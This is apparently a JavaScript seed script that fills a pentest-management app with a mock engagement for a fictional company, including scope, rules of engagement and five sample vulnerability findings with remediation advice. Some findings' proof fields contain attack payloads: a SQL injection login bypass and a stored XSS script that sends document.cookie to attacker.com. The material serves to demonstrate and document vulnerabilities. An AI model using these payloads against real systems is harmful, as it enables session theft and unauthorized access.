import prisma from '../src/database/prismaClient.js';

async function seed() {
  const orgId = "1fc73ad1-e5c4-40b7-ad37-2842567393aa"; // Nexus Cyber Corp
  const userId = "75374a7d-c9f1-43db-b545-ff8d9b3e00ee"; // Aiden Sterling

  try {
    // 1. Clean up old mock runs
    const oldProj = await prisma.pentest.findFirst({ where: { name: "SYNTHETIC_SENTINEL_V4_DEMO" } });
    if (oldProj) {
      console.log("Cleaning up old mock project...");
      await prisma.pentestCollaborator.deleteMany({ where: { pentestId: oldProj.id } });
      await prisma.workflow.deleteMany({ where: { pentestId: oldProj.id } });
      await prisma.finding.deleteMany({ where: { pentestId: oldProj.id } });
      await prisma.projectAgreement.deleteMany({ where: { pentestId: oldProj.id } });
      await prisma.pentest.delete({ where: { id: oldProj.id } });
    }

    // 2. Create the beautiful new project
    console.log("Creating new mock project...");
    const project = await prisma.pentest.create({
      data: {
        name: "SYNTHETIC_SENTINEL_V4_DEMO",
        description: "High-fidelity verification environment mimicking an enterprise web application architecture. Undergoing automated Sentinel Protocol security scans and advanced manual exploit validation.",
        status: "IN_PROGRESS",
        organizationId: orgId,
        leadPentesterId: userId,
        isPersonal: false,
        excludedAssets: "Strictly avoid testing live main gateway: api.nexuscyber.corp. Do not run high-volume DoS scanners.",
        targetDomains: ["staging.nexuscyber.corp", "portal-dev.nexuscyber.corp"],
        ipRanges: ["192.168.100.0/24", "10.0.4.0/22"],
        workflows: {
          create: {
            name: "SYNTHETIC_SENTINEL - Main Workflow",
            nodes: [
              { id: 'node-1', type: 'startingPoint', position: { x: 50, y: 150 }, data: { label: 'Scope Acquisition' } },
              { id: 'node-2', type: 'note', position: { x: 300, y: 50 }, data: { label: 'Automated Recon', text: 'Subdomain brute-forcing & active ports enumeration.' } },
              { id: 'node-3', type: 'note', position: { x: 300, y: 250 }, data: { label: 'Manual Penetration', text: 'Testing JWT validation, injection points, and privilege escalation.' } },
              { id: 'node-4', type: 'terminal', position: { x: 600, y: 150 }, data: { label: 'Exploit Execution' } }
            ],
            edges: [
              { id: 'edge-1-2', source: 'node-1', target: 'node-2', animated: true, style: { stroke: '#00c477', strokeWidth: 2 } },
              { id: 'edge-1-3', source: 'node-1', target: 'node-3', animated: true, style: { stroke: '#00c477', strokeWidth: 2 } }
            ]
          }
        },
        projectAgreements: {
          create: {
            title: "Standard Rules of Engagement - SYNTHETIC_SENTINEL_V4_DEMO",
            version: 1,
            body: "Authorized security testing agreement between Nexus Cyber Corp and Aiden Sterling. Strict adherence to specified scope and timeline.",
            scopeSummary: "Domains: staging.nexuscyber.corp, portal-dev.nexuscyber.corp. Exclude all live production subdomains.",
            allowedActions: "Web Application testing, JWT signature bypass testing, safe SQL Injection exploitation without database corruption.",
            confidentiality: "Strictly confidential under the platform terms of service.",
            legalLiability: "Mutual indemnification for actions within specified bounds.",
            createdById: userId
          }
        }
      }
    });

    // 3. Add Aiden Sterling as a HACKER collaborator
    await prisma.pentestCollaborator.create({
      data: {
        pentestId: project.id,
        userId: userId,
        role: "HACKER",
        canEditFindings: true,
        canManageSessions: true
      }
    });

    // 4. Create typical high-quality vulnerability findings
    console.log("Seeding detailed vulnerability findings...");
    await prisma.finding.createMany({
      data: [
        {
          title: "SQL Injection in User Login Gateway",
          description: "An unauthenticated SQL injection vulnerability was discovered in the `/api/v2/auth/login` endpoint through the `username` parameter. By appending malicious SQL payloads, a remote attacker can bypass authentication or execute arbitrary database queries.",
          severity: "CRITICAL",
          status: "TRIAGED",
          cvssScore: 9.8,
          affectedAsset: "staging.nexuscyber.corp/api/v2/auth/login",
          proof: "Payload used: `' OR '1'='1` in the username field. The application responds with a valid administrator session JWT token without requiring the actual password.",
          remediation: "Implement strict parameterized queries and input sanitization using prepared statements. Ensure ORM or typed database drivers are used, and avoid dynamic SQL string concatenation.",
          pentestId: project.id,
          reporterId: userId
        },
        {
          title: "Hardcoded HS256 JWT Secret Leakage",
          description: "The authentication system relies on JSON Web Tokens (JWT) signed with a static, hardcoded HS256 secret. This secret key was recovered from public development assets left in the staging portal repository.",
          severity: "HIGH",
          status: "OPEN",
          cvssScore: 8.9,
          affectedAsset: "portal-dev.nexuscyber.corp",
          proof: "The secret was identified as `nexus_cyber_staging_super_secret_key_2026`. Using jwt.io, we successfully forged an administrative token with complete workspace credentials.",
          remediation: "Immediately deprecate the leaked secret. Transition the system to use asymmetric RS256 signing, where the public/private keypair is retrieved from a secure credentials vault (e.g. AWS Secrets Manager or HashiCorp Vault) and never hardcoded in files.",
          pentestId: project.id,
          reporterId: userId
        },
        {
          title: "Stored Cross-Site Scripting (XSS) in Dashboard Customization",
          description: "An operative can inject arbitrary HTML/Javascript payloads into the dashboard customization panel. When other organization members view the compromised dashboard, the script executes inside their browser session.",
          severity: "MEDIUM",
          status: "FIXED",
          cvssScore: 6.1,
          affectedAsset: "staging.nexuscyber.corp/dashboard/settings",
          proof: "Payload injected: `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>` in the custom dashboard title field.",
          remediation: "Adopt context-aware HTML encoding on all user-supplied data output. Configure a robust Content Security Policy (CSP) headers set to restrict script execution boundaries.",
          pentestId: project.id,
          reporterId: userId
        },
        {
          title: "Insecure Direct Object Reference (IDOR) on Profile Fetching",
          description: "The `/api/v2/users/profile` endpoint accepts a numeric user ID parameter and returns personal profile data without verifying if the requesting user owns the requested record.",
          severity: "MEDIUM",
          status: "OPEN",
          cvssScore: 6.5,
          affectedAsset: "staging.nexuscyber.corp/api/v2/users/profile",
          proof: "Navigating to `/api/v2/users/profile?id=1003` as a regular hacker allows viewing the email, handle, and national ID details of User 1003, who is an external organizational stakeholder.",
          remediation: "Ensure the backend controller verifies owner authorization by matching the session userID decoded from the authentication token with the requested profile ID. Restrict ID parameter fetching to administrative scopes only.",
          pentestId: project.id,
          reporterId: userId
        },
        {
          title: "Dangling CNAME / AWS S3 Subdomain Takeover",
          description: "The subdomain `assets-dev.nexuscyber.corp` points to an AWS S3 bucket that has been deleted or unclaimed. An attacker could claim this bucket name and serve arbitrary malicious script libraries to users visiting the application.",
          severity: "LOW",
          status: "ACCEPTED_RISK",
          cvssScore: 3.5,
          affectedAsset: "assets-dev.nexuscyber.corp",
          proof: "A CNAME lookup on `assets-dev.nexuscyber.corp` returns `nexus-staging-dev-assets.s3.amazonaws.com`. Navigating to it shows a NoSuchBucket error, indicating the bucket name is unclaimed.",
          remediation: "Update the organization's DNS zone files to remove the dangling CNAME record for `assets-dev.nexuscyber.corp`, or re-register the S3 bucket under the authorized AWS account.",
          pentestId: project.id,
          reporterId: userId
        }
      ]
    });

    console.log("Mock project seed completely successful!");
    console.log("Mock Project ID:", project.id);
  } catch (e) {
    console.error("Seed error:", e);
  } finally {
    await prisma.$disconnect();
  }
}

seed();
